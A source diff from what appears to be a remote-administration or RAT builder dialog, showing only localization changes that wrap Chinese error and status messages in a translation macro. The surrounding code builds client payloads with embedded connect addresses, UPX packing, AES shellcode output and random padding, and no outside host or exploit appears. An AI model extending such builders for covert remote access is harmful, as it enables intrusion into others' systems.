@@ -423,7 +423,7 @@ void CBuildDlg::OnBnClickedOk()
             CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(ptr + iOffset);
             auto result = strlen(dst->szBuildDate) ? compareDates(dst->szBuildDate, g_ConnectAddress.szBuildDate) : -1;
             if (result > 0) {
-                MessageBoxL("客户端版本比主控程序更高, 无法生成!\r\n" + file, "提示", MB_ICONWARNING);
+                MessageBoxL(_TR("客户端版本比主控程序更高, 无法生成!") + "\r\n" + file, "提示", MB_ICONWARNING);
                 return;
             }
             if (result != -2 && result <= 0) { // 客户端版本不能不大于主控端
@@ -435,7 +435,7 @@ void CBuildDlg::OnBnClickedOk()
             bufSize -= iOffset + sizeof(g_ConnectAddress);
         }
         if (!bFind) {
-            MessageBoxL("出现内部错误，未能找到标识信息!\r\n" + file, "提示", MB_ICONWARNING);
+            MessageBoxL(_TR("出现内部错误，未能找到标识信息!") + "\r\n" + file, "提示", MB_ICONWARNING);
             SAFE_DELETE_ARRAY(szBuffer);
             return;
         }
@@ -452,19 +452,19 @@ void CBuildDlg::OnBnClickedOk()
         CFile File;
         BOOL r=File.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
         if (!r) {
-            MessageBoxL("服务程序创建失败!\r\n" + strSeverFile, "提示", MB_ICONWARNING);
+            MessageBoxL(_TR("服务程序创建失败!") + "\r\n" + strSeverFile, "提示", MB_ICONWARNING);
             SAFE_DELETE_ARRAY(szBuffer);
             return;
         }
         File.Write(szBuffer, dwFileSize);
         File.Close();
-        CString tip = index == IndexTestRun_DLL ? _TR("\r\n提示: 请生成\"ServerDll.dll\"，以便程序正常运行。") : _T("");
-        tip += g_ConnectAddress.protoType==PROTO_KCP ? _TR("\n提示: 使用KCP协议生成服务，必须设置主控UDP协议参数为1。") : _T("");
+        CString tip = index == IndexTestRun_DLL ? "\r\n" + _TR("提示: 请生成\"ServerDll.dll\"，以便程序正常运行。") : _T("");
+        tip += g_ConnectAddress.protoType==PROTO_KCP ? "\n" + _TR("提示: 使用KCP协议生成服务，必须设置主控UDP协议参数为1。") : _T("");
         std::string upx;
         if(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_UPX) upx = ReleaseUPX();
         if (!upx.empty()) {
             run_upx_async(GetParent()->GetSafeHwnd(), upx, strSeverFile.GetString(), true);
-            MessageBoxL("正在UPX压缩，请关注信息提示。\r\n文件位于: " + strSeverFile + tip, "提示", MB_ICONINFORMATION);
+            MessageBoxL(_TR("正在UPX压缩，请关注信息提示。") + "\r\n" + _TR("文件位于: ") + strSeverFile + tip, "提示", MB_ICONINFORMATION);
         } else {
             if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES) {
                 DWORD dwSize = 0;
@@ -517,7 +517,7 @@ void CBuildDlg::OnBnClickedOk()
                                 r = WriteBinaryToFile(payload.GetString(), (char*)srcData, srcLen, n == Payload_Raw ? 0 : -1);
                                 if (!r) tip = "\r\n警告: 生成载荷失败!";
                             } else {
-                                MessageBoxL("文件生成失败: \r\n" + strSeverFile, "提示", MB_ICONINFORMATION);
+                                MessageBoxL(_TR("文件生成失败: ") + "\r\n" + strSeverFile, "提示", MB_ICONINFORMATION);
                             }
                             SAFE_DELETE_ARRAY(srcData);
                         }
@@ -567,22 +567,22 @@ void CBuildDlg::OnBnClickedOk()
                 std::vector<char> padding(size, time(0)%256);
                 WriteBinaryToFile(strSeverFile.GetString(), padding.data(), size, -1);
             }
-            MessageBoxL("生成成功! 文件位于:\r\n" + strSeverFile + tip, "提示", MB_ICONINFORMATION);
+            MessageBoxL(_TR("生成成功! 文件位于:") + "\r\n" + strSeverFile + tip, "提示", MB_ICONINFORMATION);
         }
         SAFE_DELETE_ARRAY(szBuffer);
         if (index == IndexTestRun_DLL) return;
     } catch (CMemoryException* e) {
         char err[100];
         e->GetErrorMessage(err, sizeof(err));
-        MessageBoxL("内存异常:" + CString(err), "异常", MB_ICONERROR);
+        MessageBoxL(_TR("内存异常:") + CString(err), "异常", MB_ICONERROR);
     } catch (CFileException* e) {
         char err[100];
         e->GetErrorMessage(err, sizeof(err));
-        MessageBoxL("文件异常:" + CString(err), "异常", MB_ICONERROR);
+        MessageBoxL(_TR("文件异常:") + CString(err), "异常", MB_ICONERROR);
     } catch (CException* e) {
         char err[100];
         e->GetErrorMessage(err, sizeof(err));
-        MessageBoxL("其他异常:" + CString(err), "异常", MB_ICONERROR);
+        MessageBoxL(_TR("其他异常:") + CString(err), "异常", MB_ICONERROR);
     }
 
     SAFE_DELETE_ARRAY(szBuffer);
